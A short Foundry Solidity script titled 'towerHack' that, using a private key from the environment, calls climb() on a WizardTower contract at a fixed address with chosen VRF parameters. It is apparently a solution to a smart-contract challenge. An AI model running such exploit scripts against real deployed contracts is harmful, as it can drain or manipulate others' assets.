// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../contracts_/WizardTower.sol";


contract towerHack is Script {


    WizardTower constant TOWER = WizardTower(0xea87ff48a4B376505022dB85E7E1abC1ea5Db9c5);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);

        bytes32 step1 = 0x474e34a077df58807dbe9c96d3c009b23b3c6d0cce433e59bbf5b34f823bc56c; //keyhash

        uint64 step2 = 10352; //subscribtion id

        uint16 step3 = 3; //requestConfirmations

        uint32 step4 = 500000; //callbackGasLimit

        uint32 step5 = 8; //numwords

        TOWER.climb(step1, step2, step3, step4, step5);

        vm.stopBroadcast();
    }
}